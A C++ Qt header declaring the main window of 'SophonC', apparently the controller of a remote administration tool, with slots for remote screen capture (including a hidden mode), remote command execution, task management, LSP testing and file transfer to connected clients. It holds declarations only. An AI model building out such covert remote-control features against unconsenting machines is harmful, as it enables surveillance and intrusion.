#pragma once

#pragma execution_character_set("utf-8")

#include <QtWidgets/QMainWindow>

#include "ui_SophonC.h"

#include "./IOCP/IocpServer.h"

#include<QTableWidget>

#include <QInputDialog>

#include<QDateTime>

#include<QLabel>

#include"../Funtion_Network/RemoteCapture.h"

#include"../Funtion_Cmd/RemoteCmd.h"

#include "../Function_File/ChooseLocalFile.h"

#include"../Function_File/ChoosePath.h"

#include"../Function_File/FileSend.h"


class SophonC : public QMainWindow
{
	Q_OBJECT

public:

	SophonC(QMainWindow *parent = Q_NULLPTR);

	~SophonC();

private:


	Ui::SophonCClass ui;

	IocpServer *iocp;

	LinkerManager *linkerManager;

	QLabel  *permanent;

	QMenu *popMenu;

	QAction *actionOfNetwork;

	QAction *actionOfRemote;

	QAction *actionOfSys;

	QAction *actionOfCmd;

	QAction *actionOfGetOnlineInfo;

	QAction * actionOfLsp;

	QAction * hideCap;

	Linker* currentLinker;

	QString localFilePath;

	QString localFileName;

	FileSend* fileSend;

	QString redirect;

	ThreadOfRemoteCapture* threadOfRemoteCapture;

	QThread * instanceOfRemoteCapture;



private slots:

	void CreateInstance(Token, QByteArray,Linker*);

	void StartIocp();

	void StartNetwork();

	void StartTaskManager();

	void StartRemoteCapture();

	void StartRemoteCaptureHide();

	void StartCmd();

	void StartChoosePath();

	void TestLsp();

	void Redirect();

	void GetOnlineInfo();

	void DeleteARow(int Row);

	void ExecPopMenu(QPoint pos);

	void DoubleClickedToAdd(int row, int column);

	void DoubleClickedToDel(int row, int column);

	void itemClickedToReflashInfo(QTableWidgetItem *);

	void AddQueueClick();

	void ChooseFileClick();

	void ClearQueueClick();

	void FileSendClick();

	void NewServerReady(Linker* linker);

	void ServerListening(Linker* linker);

	void ServerSending(Linker* linker);

	void ServerFinish(Linker* linker);

	signals:

		void StartCap(QString ip);


};
